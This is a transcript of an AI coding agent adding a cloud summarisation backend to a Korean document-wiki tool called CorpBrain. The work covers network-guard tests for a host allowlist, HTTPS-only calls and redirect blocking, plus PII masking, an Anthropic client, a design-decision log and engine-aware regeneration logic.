      242 +                                                              
      243 +                                                              
      244 +def test_extra_headers_are_sent(monkeypatch: pytest.MonkeyPatc
          +h) -> None:                                                   
      245 +    """v0.5 §4.3: 인증 헤더 등 provider 고유 헤더를 실어 보낼 
          +수 있다 (공식 SDK 미사용)."""                                 
      246 +    calls = _stub_urlopen(monkeypatch, body=b"{}")            
      247 +                                                              
      248 +    gateway.request_json(                                     
      249 +        ANTHROPIC_URL,                                        
      250 +        method="POST",                                        
      251 +        payload={"model": "claude"},                          
      252 +        headers={"x-api-key": "sk-test", "anthropic-version": 
          +"2023-06-01"},                                                
      253 +        allowed_hosts=("api.anthropic.com",),                 
      254 +        require_https=True,                                   
      255 +    )                                                         
      256 +                                                              
      257 +    request, _timeout = calls[0]                              
      258 +    assert request.get_header("X-api-key") == "sk-test"       
      259 +    assert request.get_header("Anthropic-version") == "2023-06
          +-01"                                                          
      260 +    assert request.get_header("Content-type") == "application/
          +json"                                                         
      261 +                                                              
      262 +                                                              
      263 +def test_disallowed_host_is_blocked_before_socket(monkeypatch:
          + pytest.MonkeyPatch) -> None:                                 
      264 +    """v0.5 §4.4: allowlist 밖 호스트는 소켓을 열기 전에 차단 
          +되고 기록도 남지 않는다."""                                   
      265 +    calls = _stub_urlopen(monkeypatch)                        
      266 +                                                              
      267 +    with pytest.raises(gateway.NetworkGuardError):            
      268 +        gateway.request_json(                                 
      269 +            "https://evil.example.com/v1/messages", allowed_ho
          +sts=("api.anthropic.com",)                                    
      270 +        )                                                     
      271 +                                                              
      272 +    assert calls == []                                        
      273 +    assert gateway.requested_urls() == ()                     
      274 +                                                              
      275 +                                                              
      276 +def test_allowed_host_matches_case_insensitively(monkeypatch: 
          +pytest.MonkeyPatch) -> None:                                  
      277 +    """호스트 비교는 대소문자를 무시한 정확 일치다."""        
      278 +    _stub_urlopen(monkeypatch, body=b"{}")                    
      279 +                                                              
      280 +    gateway.request_json(                                     
      281 +        "https://API.Anthropic.COM/v1/models", allowed_hosts=(
          +"api.anthropic.com",)                                         
      282 +    )                                                         
      283 +                                                              
      284 +    assert gateway.requested_urls() == ("https://API.Anthropic
          +.COM/v1/models",)                                             
      285 +                                                              
      286 +                                                              
      287 +def test_subdomain_is_not_allowed_by_suffix_match(monkeypatch:
          + pytest.MonkeyPatch) -> None:                                 
      288 +    """서픽스·와일드카드 매칭을 쓰지 않는다 — 하위 도메인은 허
          +용되지 않는다."""                                             
      289 +    _stub_urlopen(monkeypatch)                                
      290 +                                                              
      291 +    with pytest.raises(gateway.NetworkGuardError):            
      292 +        gateway.request_json(                                 
      293 +            "https://evil.api.anthropic.com/v1/messages",     
      294 +            allowed_hosts=("api.anthropic.com",),             
      295 +        )                                                     
      296 +                                                              
      297 +                                                              
      298 +def test_require_https_rejects_plain_http(monkeypatch: pytest.
          +MonkeyPatch) -> None:                                         
      299 +    """클라우드 경로는 HTTPS만 허용한다 (v0.5 §4.4)."""       
      300 +    calls = _stub_urlopen(monkeypatch)                        
      301 +                                                              
      302 +    with pytest.raises(gateway.NetworkGuardError):            
      303 +        gateway.request_json(                                 
      304 +            "http://api.anthropic.com/v1/messages",           
      305 +            allowed_hosts=("api.anthropic.com",),             
      306 +            require_https=True,                               
      307 +        )                                                     
      308 +                                                              
      309 +    assert calls == []                                        
      310 +                                                              
      311 +                                                              
      312 +def test_local_path_without_allowlist_is_unrestricted(monkeypa
          +tch: pytest.MonkeyPatch) -> None:                             
      313 +    """`allowed_hosts=None`이면 호스트를 제한하지 않는다 (기존
          + 로컬 호출 하위 호환)."""                                     
      314 +    _stub_urlopen(monkeypatch, body=b"{}")                    
      315 +                                                              
      316 +    assert gateway.request_json(OLLAMA_URL) == {}             
      317 +                                                              
      318 +                                                              
      319 +def test_network_guard_error_is_a_gateway_error() -> None:    
      320 +    """NetworkGuard 거부도 관문 예외 계층에 속한다 (어댑터가  
          +한 뿌리로 잡는다)."""                                         
      321 +    error = gateway.NetworkGuardError("blocked", url=ANTHROPIC
          +_URL)                                                         
      322 +                                                              
      323 +    assert isinstance(error, gateway.GatewayError)            
      324 +    assert isinstance(error, CorpBrainError)                  
      325 +                                                              
      326 +                                                              
      327 +def test_redirects_are_not_followed() -> None:                
      328 +    """3xx는 추적하지 않는다 — 커스텀 핸들러가 `redirect_reque
          +st`를 무력화한다 (v0.5 §4.4)."""                              
      329 +    handler = gateway._NoRedirectHandler()                    
      330 +                                                              
      331 +    assert (                                                  
      332 +        handler.redirect_request(                             
      333 +            None, None, 302, "Found", {}, "https://evil.exampl
          +e.com/"                                                       
      334 +        )                                                     
      335 +        is None                                               
      336 +    )                                                         
      337 +                                                              
      338 +                                                              
      339 +def test_opener_has_no_redirect_handler() -> None:            
      340 +    """관문 opener는 표준 리다이렉트 핸들러 대신 차단 핸들러를
          + 쓴다."""                                                     
      341 +    handlers = [type(handler) for handler in gateway._OPENER.h
          +andlers]                                                      
      342 +                                                              
      343 +    assert gateway._NoRedirectHandler in handlers             
      344 +                                                              
      345 +                                                              
      346  #: 관문 밖에서 import 되면 안 되는 네트워크 라이브러리 (접두사
            매칭).
      347  #: `urllib.parse`처럼 순수 문자열 처리 모듈은 허용한다.
      348  _NETWORK_MODULES = frozenset(

  Ran 1 shell command (ctrl+o to expand)

● 관문 테스트 24개 통과. 이제 Anthropic 클라이언트를 만든다.

  Ran 1 shell command (ctrl+o to expand)

● Write(corpbrain\core\llm\base.py)
  ⎿  Wrote 76 lines to corpbrain\core\llm\base.py
      1 """요약 백엔드 공통 계약 — 인터페이스와 응답 검증 (v0.5 스펙 §4.3
      2 
      3 로컬(Ollama)과 클라우드(Anthropic) 두 백엔드가 같은 `SummaryResul
        t`를 내도록, 응답 검증
        진에 따라 위키 품질 기준이
      5 달라지는" 상황이 생기므로 의도적으로 공유한다.
      7 `Summarizer` 프로토콜은 파이프라인이 엔진을 값으로 고르게 하는 이
        음새다 — 파이프라인은
      8 구현체가 로컬인지 클라우드인지 모른 채 `summarize(text)`만 호출한
      9 """
     … +81 lines (ctrl+o to expand)

● Agent "파트 B: core/consent.py 구현" finished · 4m 18s

● 파트 B(consent) 완료 — 23 테스트 통과. 보고된 결정들을 스펙과 대조해 분류를
  재판정하겠다(스펙이 이미 허용한 선택지는 신규 결정이 아니다). 먼저 Anthropic
  클라이언트를 마저 쓴다.
● Write(corpbrain\core\llm\anthropic_client.py)
  ⎿  Wrote 297 lines to corpbrain\core\llm\anthropic_client.py
       1 """Anthropic Messages API 클라이언트 — 클라우드 요약 백엔드 (v0.
       2 
         체 HTTP 커넥션을 열어
         uard·PII 마스킹 게이트가
         증 헤더를 실어 raw HTTP로
       6 Messages API를 직접 호출한다 — 이 모듈은 HTTP 라이브러리를 직접 
       7 
          — Ollama의 프롬프트 기반
         칙 자체는 로컬 백엔드와
         품질 기준이 달라지지 않게 한다.
     … +353 lines (ctrl+o to expand)

● Agent "파트 A: core/pii.py 구현" finished · 6m 8s

● 파트 A도 완료 — 50 테스트 통과, 전체 스위트 420 passed. 반환 타입명이
  MaskingResult이므로 import를 맞추고, 두 에이전트의 보고를 스펙과 대조해
  체크포인트에 기록한다.

● Update(corpbrain\core\llm\anthropic_client.py)
  ⎿  Added 3 lines, removed 3 lines
      24  from corpbrain.core.errors import CorpBrainError, PreconditionE
          rror
      25  from corpbrain.core.llm.base import LLMParseError, validate_sum
          mary_fields
      26  from corpbrain.core.models import SummaryResult
      27 -from corpbrain.core.pii import PiiMaskResult, mask_pii         
      27 +from corpbrain.core.pii import MaskingResult, mask_pii         
      28  
      29  #: NetworkGuard allowlist — 하드코딩 단일 호스트이며 CLI로 over
          ride할 수 없다 (v0.5 §4.4).
      30  ANTHROPIC_HOST = "api.anthropic.com"
     ...
      177      api_key: str,
      178      *,
      179      timeout: float = DEFAULT_TIMEOUT,
      180 -) -> tuple[SummaryResult, PiiMaskResult]:                     
      180 +) -> tuple[SummaryResult, MaskingResult]:                     
      181      """절단된 문서 텍스트를 클라우드에서 고정 필드 요약으로 변
           환한다.
      182  
      183      전송 직전 PII 7종을 마스킹한다 (v0.5 §4.5) — 원문 PII는 관
           문 밖으로 나가지 않는다.
     ...
      286          self._api_key = api_key
      287          self._timeout = timeout
      288          #: 직전 요약에서 마스킹된 PII 건수 (리포트 집계용).
      289 -        self.last_mask: PiiMaskResult | None = None           
      289 +        self.last_mask: MaskingResult | None = None           
      290  
      291      def summarize(self, text: str) -> SummaryResult:
      292          """문서 텍스트를 클라우드에서 요약한다 (전송 직전 PII 
           마스킹)."""

● Update(docs\loop\DECISION_CHECKPOINT-v0.5.md)
  ⎿  Added 2 lines, removed 2 lines
       3  이 문서는 v0.5 구현 루프의 **조기 종료 판정 단일 근거**다.
       4  CORE_BUDGET(≥3) · MINOR_BUDGET(≥10)은 오직 아래 카운터로만 판정
          한다.
       5  
       6 -CORE: 0                                                        
       7 -MINOR: 0                                                       
       6 +CORE: 1                                                        
       7 +MINOR: 8                                                       
       8  
       9  ## 기록 규칙
      10  - 형식: `- [CORE|MINOR] <결정> | 근거 | 관련 파일 | 결정 주체(m
          ain|sub-A|sub-B)`

● Update(docs\loop\DECISION_CHECKPOINT-v0.5.md)
  ⎿  Added 23 lines, removed 1 line
      15    최종 보고로 반환하고, 메인이 이를 반영하며 카운터를 갱신한다.
           읽기는 모든 에이전트가 가능하다.
      16  
      17  ## 결정 목록
      18 -(아직 없음)                                                    
      18 +                                                               
      19 +### 메인 에이전트 (파트 C — 관문·클라우드 클라이언트·통합)     
      20 +- [CORE] Anthropic API 키는 `anthropic_client` 코어 모듈이 호출
         + 시점에 `os.environ`에서 직접 읽고 `ScanConfig`에 싣지 않는다 |
         + 스펙 §4.1은 "환경변수로만 받는다"만 규정하고 어느 계층이 읽는 
         +지는 미정. 기존 관례(CLI가 env 해소 후 ScanConfig에 담기)를 따 
         +르면 자격증명이 로그·에러에 repr될 수 있는 값 객체에 실린다 —  
         +보안상 수명·노출면을 최소화하려고 관례에서 의도적으로 벗어났다 
         +| `corpbrain/core/llm/anthropic_client.py` | main              
      21 +- [MINOR] cloud 요약 타임아웃은 300초(로컬 `summarize.DEFAULT_T
         +IMEOUT`과 동일), 프리플라이트는 60초 | 스펙 §4.3은 "기존 DEFAUL
         +T_TIMEOUT(60초)를 재사용"이라고 적었으나 실제 코드베이스는 `sum
         +marize=300.0`·`embed=60.0`으로 60초 공유 상수가 존재하지 않는다
         +. 같은 성격(요약)의 값을 따르고 가벼운 프리플라이트만 60초를 쓰
         +는 것으로 스펙의 의도(신규 정책을 만들지 않는다)를 지켰다 | `co
         +rpbrain/core/llm/anthropic_client.py` | main                   
      22 +                                                               
      23 +### 파트 A (`core/pii.py`) — sub-A 보고를 메인이 재분류해 기록 
      24 +- [MINOR] `[REDACTED_<TYPE>]`의 TYPE 토큰을 `RRN`/`PHONE`/`EMAI
         +L`/`BIZ_NO`/`CARD`/`ACCOUNT`/`IP`로 확정 | 스펙 §4.5는 플레이스
         +홀더 형태만 정하고 토큰 문자열은 미정 | `corpbrain/core/pii.py`
         + | sub-A                                                       
      25 +- [MINOR] 패턴 적용 순서를 우선순위로 정의(EMAIL → RRN → CARD →
         + PHONE → BIZ_NO → ACCOUNT → IP) | 계좌번호 휴리스틱이 사업자·전
         +화·카드 패턴을 삼켜 라벨이 뭉개지므로 좁은 패턴을 먼저 적용. 스
         +펙은 적용 순서를 미규정(마스킹 자체는 어느 순서든 이뤄지므로 보
         +안 영향 없음) | `corpbrain/core/pii.py` | sub-A                
      26 +- [MINOR] 반환 타입 `MaskingResult(text, counts, .total)`, `cou
         +nts`에는 1건 이상인 유형만 담는다 | 스펙은 "치환 개수 집계"만  
         +요구하고 자료구조 미정 | `corpbrain/core/pii.py` | sub-A       
      27 +- [MINOR] 집계 단위는 등장 건수(같은 이메일 3회 → 3) | 스펙에  
         +집계 단위 명시 없음 | `corpbrain/core/pii.py` | sub-A          
      28 +                                                               
      29 +### 파트 B (`core/consent.py`) — sub-B 보고를 메인이 재분류해  
         +기록                                                           
      30 +- [MINOR] 설정 파일이 없는 상태의 revoke는 실패가 아니라 `grant
         +ed: false`를 기록해 파일을 만든다 | 사후 상태를 결정적·멱등으로
         + 만들기 위함(스펙 §3 항목3의 exit 0 요구 충족) | `corpbrain/cor
         +e/consent.py` | sub-B                                          
      31 +- [MINOR] 기존 파일이 손상 JSON·비-객체면 grant/revoke가 보존  
         +없이 새 문서로 덮어쓴다 | 스펙 §4.2의 "다른 키는 보존"은 파싱  
         +가능한 경우의 규정. 손상 파일 때문에 동의 기록이 영구히 막히면 
         +안 되며, 읽기는 여전히 "동의 없음"으로 흡수되므로 보안 계약은  
         +유지된다 | `corpbrain/core/consent.py` | sub-B                 
      32 +- [MINOR] 쓰기 실패는 `ConsentStoreError(PreconditionError)`로 
         +올린다 | 스펙 미규정. 읽기 실패는 "동의 없음"으로 흡수해도 되지
         +만 쓰기 실패를 삼키면 사용자가 동의가 기록됐다고 오해한다. 기존
         + exit 1 매핑을 그대로 재사용하므로 신규 종료 코드는 없다 | `cor
         +pbrain/core/consent.py` | sub-B                                
      33 +                                                               
      34 +### 기록하지 않은 보고 항목 (감사용 — 신규 결정이 아니라고 판정
         +)                                                              
      35 +- `granted`를 정확한 boolean `True`로만 판정: 스펙 §4.2 "`grant
         +ed`가 `true`가 아니면 동의 없음"의 직접적 구현이다.            
      36 +- revoke가 `granted: false`를 남기는 것 자체: 스펙 §4.2가 "둘  
         +중 무엇이든"으로 두 선택지를 이미 승인했다.                    
      37 +- 원자적 쓰기의 mkstemp·fsync·unlink 세부: 스펙 §4.2가 지시한 "
         +임시 파일 + `os.replace`"의 표준 구현이다.                     
      38 +- `PiiType.label`의 한국어 유형명: 스펙 §4.5 표의 '유형' 열 값 
         +을 그대로 노출한 것이다.                                       
      39 +- consent 설정 파일의 JSON 들여쓰기 형식: 계약에 영향 없는 포맷
         + latitude.                                                     
      40 +- 리다이렉트 차단을 클라우드뿐 아니라 로컬 경로에도 적용: 스펙 
         +§4.4가 클라우드에 요구한 것을 안전한 방향으로 일반화했을 뿐, 규
         +정된 동작을 바꾸지 않는다.                                     

● Update(corpbrain\core\llm\summarize.py)
  ⎿  Added 10 lines, removed 5 lines
      17  
      18  from corpbrain.core import gateway
      19  from corpbrain.core.config import DEFAULT_MODEL, DEFAULT_OLLAMA
          _URL
      20 -from corpbrain.core.errors import CorpBrainError               
      20 +from corpbrain.core.llm.base import (                          
      21 +    LIST_FIELDS as _LIST_FIELDS,                               
      22 +)                                                              
      23 +from corpbrain.core.llm.base import (                          
      24 +    TEXT_FIELDS as _TEXT_FIELDS,                               
      25 +)                                                              
      26 +from corpbrain.core.llm.base import (                          
      27 +    LLMParseError,                                             
      28 +    validate_summary_fields,                                   
      29 +)                                                              
      30  from corpbrain.core.models import SummaryResult
      31  
      32  #: 단일 프롬프트 생성 엔드포인트.
     ...
      35  #: 요약 1건의 소켓 타임아웃(초). 로컬 7B 모델이 12,000자를 처리
          할 여유를 둔다.
      36  DEFAULT_TIMEOUT = 300.0
      37  
      29 -#: 문자열 필드와 문자열 배열 필드 (스펙 §4.3의 고정 필드).     
      30 -_TEXT_FIELDS = ("title", "one_line_summary", "summary")        
      31 -_LIST_FIELDS = ("key_points", "tags")                          
      32 -                                                               
      38  PROMPT_TEMPLATE = """당신은 사내 문서를 정리하는 한국어 지식 관
          리 도우미입니다.
      39  아래 문서를 읽고 JSON 객체 하나만 출력하세요. 설명·코드블록·군
          더더기 없이 JSON만 출력합니다.
      40  

● Update(corpbrain\core\llm\summarize.py)
  ⎿  Removed 4 lines
      59  """
      60  
      61  
      62 -class LLMParseError(CorpBrainError):                           
      63 -    """LLM 응답을 고정 필드 JSON으로 해석하지 못함 — 해당 파일 
         -만 스킵된다."""                                                
      64 -                                                               
      65 -                                                               
      62  def build_prompt(text: str) -> str:
      63      """요약 프롬프트를 만든다 (출력 언어는 항상 한국어 — 스펙 §
          4.3)."""
      64      return PROMPT_TEMPLATE.format(document=text)

● Update(corpbrain\core\llm\summarize.py)
  ⎿  Added 6 lines, removed 24 lines
      100  
      101  
      102  def parse_summary(raw: str) -> SummaryResult:
      103 -    """모델이 낸 JSON 문자열을 검증해 `SummaryResult`로 만든다
          -."""                                                          
      103 +    """모델이 낸 JSON 문자열을 검증해 `SummaryResult`로 만든다
          +.                                                             
      104 +                                                              
      105 +    필드 검증 규칙 자체는 클라우드 백엔드와 공유한다 (`llm.bas
          +e.validate_summary_fields`) —                                 
      106 +    엔진에 따라 위키 품질 기준이 달라지지 않게 한다 (v0.5 스펙
          + §4.3).                                                       
      107 +    """                                                       
      108      try:
      109          parsed = json.loads(raw)
      110      except (TypeError, ValueError) as exc:
      111          raise LLMParseError(f"응답이 유효한 JSON이 아닙니다: {
           raw[:200]!r}") from exc
      112  
      109 -    if not isinstance(parsed, dict):                          
      110 -        raise LLMParseError(f"응답 JSON이 객체가 아닙니다: {ty
          -pe(parsed).__name__}")                                        
      113 +    return validate_summary_fields(parsed)                    
      114  
      112 -    values: dict[str, Any] = {}                               
      113 -    for field in _TEXT_FIELDS:                                
      114 -        value = parsed.get(field)                             
      115 -        if not isinstance(value, str) or not value.strip():   
      116 -            raise LLMParseError(f"필수 문자열 필드가 없거나 비
          -어 있습니다: {field}")                                        
      117 -        values[field] = value.strip()                         
      115  
      119 -    for field in _LIST_FIELDS:                                
      120 -        value = parsed.get(field)                             
      121 -        if not isinstance(value, list) or not all(isinstance(i
          -tem, str) for item in value):                                 
      122 -            raise LLMParseError(f"필수 배열 필드가 문자열 배열
          -이 아닙니다: {field}")                                        
      123 -        values[field] = [item.strip() for item in value if ite
          -m.strip()]                                                    
      124 -                                                              
      125 -    return SummaryResult(                                     
      126 -        title=values["title"],                                
      127 -        one_line_summary=values["one_line_summary"],          
      128 -        key_points=values["key_points"],                      
      129 -        summary=values["summary"],                            
      130 -        tags=values["tags"],                                  
      131 -    )                                                         
      132 -                                                              
      133 -                                                              
      116  def _response_text(envelope: Any) -> str:
      117      """Ollama `/api/generate` 응답 봉투에서 모델이 생성한 본문
            문자열을 꺼낸다."""
      118      if not isinstance(envelope, dict):

  Ran 1 shell command (ctrl+o to expand)

● Update(corpbrain\core\llm\summarize.py)
  ⎿  Added 1 line, removed 10 lines
      17  
      18  from corpbrain.core import gateway
      19  from corpbrain.core.config import DEFAULT_MODEL, DEFAULT_OLLAMA
          _URL
      20 -from corpbrain.core.llm.base import (                          
      21 -    LIST_FIELDS as _LIST_FIELDS,                               
      22 -)                                                              
      23 -from corpbrain.core.llm.base import (                          
      24 -    TEXT_FIELDS as _TEXT_FIELDS,                               
      25 -)                                                              
      26 -from corpbrain.core.llm.base import (                          
      27 -    LLMParseError,                                             
      28 -    validate_summary_fields,                                   
      29 -)                                                              
      20 +from corpbrain.core.llm.base import LLMParseError, validate_sum
         +mary_fields                                                    
      21  from corpbrain.core.models import SummaryResult
      22  
      23  #: 단일 프롬프트 생성 엔드포인트.

  Ran 2 shell commands (ctrl+o to expand)

● 린트·테스트 모두 통과. 여기까지 커밋하고 통합 배선을 계속한다.

  Ran 1 shell command (ctrl+o to expand)

● 통합 배선을 시작한다 — config·models·render·rerun 먼저.

● Update(corpbrain\core\config.py)
  ⎿  Added 8 lines
      23  #: 스캔 전체 예상 토큰 예산 — 초과 시 차단한다 (v0.3 스펙 §4.4)
          .
      24  DEFAULT_MAX_TOTAL_TOKENS = 200_000
      25  
      26 +#: 요약 엔진 (v0.5 스펙 §4.1). 기본은 로컬이며, 클라우드는 사용
         +자가 명시적으로 켤 때만 쓴다.                                  
      27 +ENGINE_LOCAL = "local"                                         
      28 +ENGINE_CLOUD = "cloud"                                         
      29 +ENGINES: tuple[str, ...] = (ENGINE_LOCAL, ENGINE_CLOUD)        
      30 +                                                               
      31 +#: `--cloud-model` 기본값 — 빠르고 저렴한 모델 (v0.5 스펙 §4.1)
         +.                                                              
      32 +DEFAULT_CLOUD_MODEL = "claude-haiku-4-5-20251001"              
      33 +                                                               
      34  #: 지원 포맷 4종 (스펙 §4.2 + v0.2 §4.1 `.pdf`). 그 외 확장자는
           스킵한다.
      35  SUPPORTED_EXTENSIONS: frozenset[str] = frozenset({".docx", ".tx
          t", ".md", ".pdf"})
      36  

● Update(corpbrain\core\config.py)
  ⎿  Added 7 lines
      57      max_total_tokens: int = DEFAULT_MAX_TOTAL_TOKENS
      58      #: 차단 게이트(GPU·토큰)를 무시하고 강행한다 — `file_too_la
          rge` 스킵에는 영향 없음 (v0.3 §4.2).
      59      force_gates: bool = False
      60 +    #: 요약 엔진 — `"local"`(기본, v0.4까지와 동일) 또는 `"clou
         +d"` (v0.5 §4.1).                                               
      61 +    #: `"cloud"`는 사용자 동의와 `ANTHROPIC_API_KEY`가 모두 있 
         +어야 하며, 임베딩은 엔진과                                     
      62 +    #: 무관하게 항상 로컬이다 (v0.5 §2 비목표).                
      63 +    engine: str = ENGINE_LOCAL                                 
      64 +    #: `engine="cloud"`일 때 쓸 Anthropic 모델 (v0.5 §4.1). API
         + 키는 여기 담지 않는다 —                                       
      65 +    #: 자격증명은 `llm.anthropic_client`가 호출 시점에 환경변수
         +에서 직접 읽는다.                                              
      66 +    cloud_model: str = DEFAULT_CLOUD_MODEL                     

● Update(corpbrain\core\models.py)
  ⎿  Added 4 lines
      23      UP_TO_DATE = "up_to_date"
      24      #: 개별 파일 크기가 `max_file_size`를 초과해 스킵 (v0.3 스
          펙 §4.2 파일 크기 게이트).
      25      FILE_TOO_LARGE = "file_too_large"
      26 +    #: 클라우드 요약이 레이트리밋(429)에 걸림 — 재시도 없이 스 
         +킵 (v0.5 스펙 §3 항목8).                                       
      27 +    CLOUD_RATE_LIMITED = "cloud_rate_limited"                  
      28 +    #: 429 외 모든 클라우드 호출 실패(5xx·타임아웃·연결오류·400
         +/404 등) (v0.5 §3 항목8).                                      
      29 +    CLOUD_API_ERROR = "cloud_api_error"                        
      30  
      31  
      32  @dataclass(frozen=True)

● Update(corpbrain\core\models.py)
  ⎿  Added 15 lines
      58  
      59  
      60  @dataclass(frozen=True)
      61 +class PiiMasking:                                              
      62 +    """클라우드로 보내기 전 문서 1건에서 마스킹한 PII 집계 (v0.
         +5 스펙 §4.5).                                                  
      63 +                                                               
      64 +    `EmbeddingFailure`와 같은 성격의 파일별 부가 기록이다 — 위 
         +키는 정상 생성되며,                                            
      65 +    이 값은 "무엇이 얼마나 가려져 나갔는지"를 리포트에 표시하는
         + 데만 쓴다.                                                    
      66 +    """                                                        
      67 +                                                               
      68 +    path: Path                                                 
      69 +    #: 마스킹된 총 건수.                                       
      70 +    total: int                                                 
      71 +    #: 유형 이름(`PiiType` 값 문자열) → 치환 건수. 1건 이상인  
         +유형만 담는다.                                                 
      72 +    counts: dict[str, int] = field(default_factory=dict)       
      73 +                                                               
      74 +                                                               
      75 +@dataclass(frozen=True)                                        
      76  class SearchResult:
      77      """벡터 검색 결과 1건 (v0.4 스펙 §4.3) — `VectorStore.searc
          h()`가 돌려준다."""
      78  

● Update(corpbrain\core\models.py)
  ⎿  Added 2 lines
      101      skipped: list[SkippedFile] = field(default_factory=list)
      102      #: 프리플라이트 통과 후 개별 문서의 임베딩 런타임 실패 (위
           키는 유지, 인덱싱만 실패) (v0.4 §4.3).
      103      embedding_failures: list[EmbeddingFailure] = field(default
           _factory=list)
      104 +    #: 클라우드로 보내기 전 마스킹한 PII 집계 (파일별). `engin
          +e="local"`이면 항상 빈 목록이다 (v0.5 §4.5).                  
      105 +    pii_maskings: list[PiiMasking] = field(default_factory=lis
          +t)                                                            
      106      #: 스캔 대상이 상한(`ScanConfig.max_files`)을 넘어 처리를 
           중단했는가.
      107      limit_exceeded: bool = False
      108      #: 상한 판정에 사용된 발견 파일 수.

● Now the renderer and re-run policy.

● Update(corpbrain\core\render.py)  ⎿  Added 8 lines, removed 2 lines
       8  
       9  from corpbrain.core.models import SummaryResult
      10  
      11 -#: 생성물이 반드시 포함해야 하는 front-matter 키 (스펙 §3 완료 
         -의 정의 2번).                                                  
      12 -FRONT_MATTER_KEYS: tuple[str, ...] = ("source_path", "generated
         -_at", "model", "source_bytes")                                 
      11 +#: 생성물이 반드시 포함해야 하는 front-matter 키 (스펙 §3 완료 
         +의 정의 2번 · v0.5 §4.6 `engine`).                             
      12 +FRONT_MATTER_KEYS: tuple[str, ...] = (                         
      13 +    "source_path",                                             
      14 +    "generated_at",                                            
      15 +    "model",                                                   
      16 +    "engine",                                                  
      17 +    "source_bytes",                                            
      18 +)                                                              
      19  
      20  #: 생성물이 반드시 포함해야 하는 본문 섹션 헤더 (스펙 §4.4, 순
          서 고정).
      21  SECTION_HEADERS: tuple[str, ...] = (

● Update(corpbrain\core\render.py)
  ⎿  Added 4 lines
      33      model: str,
      34      source_bytes: int,
      35      generated_at: str,
      36 +    engine: str = ENGINE_LOCAL,                                
      37  ) -> str:
      38      """요약 결과를 스펙 §4.4 템플릿으로 렌더한다.
      39  
     ...
      43          model: 요약에 사용한 모델 이름.
      44          source_bytes: 원문 바이트 크기.
      45          generated_at: ISO8601 생성 시각 (렌더러는 시각을 자체 
          생성하지 않는다).
      46 +        engine: 요약에 사용한 엔진 (`"local"`·`"cloud"`) — 생성
         +물만 보고도 이 문서가                                          
      47 +            외부로 나갔는지 구별할 수 있게 front-matter에 남긴 
         +다 (v0.5 §4.6).                                                
      48      """
      49      lines: list[str] = [
      50          "---",
      51          f'source_path: "{_quote(source_path)}"',
      52          f'generated_at: "{_quote(generated_at)}"',
      53          f'model: "{_quote(model)}"',
      54 +        f'engine: "{_quote(engine)}"',                         
      55          f"source_bytes: {source_bytes}",
      56          "---",
      57          "",

● Update(corpbrain\core\render.py)
  ⎿  Added 1 line
       6  
       7  from __future__ import annotations
       8  
       9 +from corpbrain.core.config import ENGINE_LOCAL                 
      10  from corpbrain.core.models import SummaryResult
      11  
      12  #: 생성물이 반드시 포함해야 하는 front-matter 키 (스펙 §3 완료
          의 정의 2번 · v0.5 §4.6 `engine`).

● Write(corpbrain\core\rerun.py)
  ⎿  Added 46 lines, removed 1 line
       2  
       3  요약·렌더 이전 단계에서 평가해 변경 없는 파일에 대한 불필요한 L
          LM 호출을 막는다.
       4  재생성하지 않는 파일은 실패가 아니라 `SkipReason.UP_TO_DATE`로 
          보고된다 (FR-015·FR-016).
       5 +                                                               
       6 +v0.5부터는 mtime에 더해 **엔진 전환**도 재생성 사유다 — 기존 위
         +키가 어느 엔진으로                                             
       7 +만들어졌는지는 front-matter `engine` 값에 남아 있고, 이번 실행 
         +의 `--engine`과 다르면                                         
       8 +mtime과 무관하게 다시 만든다 (v0.5 스펙 §4.6). 사용자가 엔진을 
         +바꾼 의도가 즉시 반영된다.                                     
       9  """
      10  
      11  from __future__ import annotations
      12  
      13 +import re                                                      
      14  from pathlib import Path
      15  
      16 +from corpbrain.core.config import ENGINE_LOCAL                 
      17  
      12 -def should_regenerate(source_path: Path, out_path: Path, force:
         - bool = False) -> bool:                                        
      18 +#: front-matter의 `engine: "..."` 한 줄. 값의 따옴표는 있어도  
         +없어도 읽는다.                                                 
      19 +_ENGINE_LINE = re.compile(r'^engine:\s*"?([^"\r\n]*)"?\s*$', re
         +.MULTILINE)                                                    
      20 +                                                               
      21 +#: front-matter를 찾기 위해 읽어들이는 앞부분 크기(바이트). 템 
         +플릿상 front-matter는                                          
      22 +#: 200바이트 안팎이라 넉넉하며, 위키 전체를 메모리에 올리지 않 
         +기 위한 상한이다.                                              
      23 +_FRONT_MATTER_PEEK = 2048                                      
      24 +                                                               
      25 +                                                               
      26 +def should_regenerate(                                         
      27 +    source_path: Path,                                         
      28 +    out_path: Path,                                            
      29 +    force: bool = False,                                       
      30 +    engine: str | None = None,                                 
      31 +) -> bool:                                                     
      32      """원문을 다시 요약·렌더해야 하는지 판단한다.
      33  
      34      Args:
      35          source_path: 원문 파일 경로.
      36          out_path: FR-012 미러링 규칙으로 산정한 위키 경로.
      37          force: `--force` — mtime과 무관하게 강제 재생성.
      38 +        engine: 이번 실행의 요약 엔진(선택). 주면 기존 위키의 f
         +ront-matter `engine` 값과                                      
      39 +            비교해 다를 때 mtime과 무관하게 재생성한다 (v0.5 §4
         +.6). `None`이면 엔진을                                         
      40 +            보지 않는다(v0.4까지의 동작).                      
      41  
      42      Returns:
      43          재생성해야 하면 True, 최신 상태라 건너뛰어도 되면 False
          .
     ...
      46          return True
      47      if not out_path.exists():
      48          return True
      49 +    if engine is not None and read_engine(out_path) != engine: 
      50 +        return True                                            
      51      return source_path.stat().st_mtime > out_path.stat().st_mti
          me
      52 +                                                               
      53 +                                                               
      54 +def read_engine(out_path: Path) -> str:                        
      55 +    """기존 위키 front-matter에 기록된 엔진을 읽는다 (v0.5 §4.6
         +).                                                             
      56 +                                                               
      57 +    `engine` 키가 없는 위키(v0.4 이전 생성물)는 `"local"`로 본 
         +다 — 클라우드 경로가                                           
      58 +    존재하지 않던 시절의 산출물은 정의상 로컬이며, 이렇게 해야 
         +v0.5로 올린 것만으로                                           
      59 +    기존 위키가 전부 재생성되지 않는다(로드맵의 하위 호환 불변 
         +식).                                                           
      60 +                                                               
      61 +    읽기에 실패하면(권한·인코딩 등) 역시 `"local"`로 본다 — 판 
         +정 실패가 대량 재생성으로                                      
      62 +    번지지 않게 하고, 실제 재생성 여부는 뒤이은 mtime 비교가 결
         +정하게 둔다.                                                   
      63 +    """                                                        
      64 +    try:                                                       
      65 +        with out_path.open("r", encoding="utf-8", errors="repla
         +ce") as handle:                                                
      66 +            head = handle.read(_FRONT_MATTER_PEEK)             
      67 +    except OSError:                                            
      68 +        return ENGINE_LOCAL                                    
      69 +    match = _ENGINE_LINE.search(head)                          
      70 +    if match is None:                                          
      71 +        return ENGINE_LOCAL                                    
      72 +    return match.group(1).strip() or ENGINE_LOCAL              

